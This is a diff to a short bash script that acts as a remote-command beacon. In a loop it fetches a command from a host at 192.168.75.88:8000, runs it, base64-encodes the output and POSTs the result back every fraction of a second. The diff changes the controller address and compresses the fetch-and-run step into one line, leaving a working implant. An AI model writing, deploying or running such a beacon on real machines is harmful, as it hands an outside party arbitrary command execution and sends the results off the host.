@@ -1,5 +1,5 @@
 #!/bin/bash
-ip="192.168.1.4"
+ip="192.168.75.88"
 port="8000"
 interface="eth0"
 n=.3
@@ -15,9 +15,8 @@ resultl="http://$ip:$port/Lin-results/$name/"
 
 while :
 do  
-    res1=$(curl $taskl)
-    res=$($res1|base64)
-    echo $res > /tmp/result
+   
+    echo $($(curl $taskl)|base64) > /tmp/result
     curl -X POST --data "@/tmp/result" $resultl
     sleep $n
 done
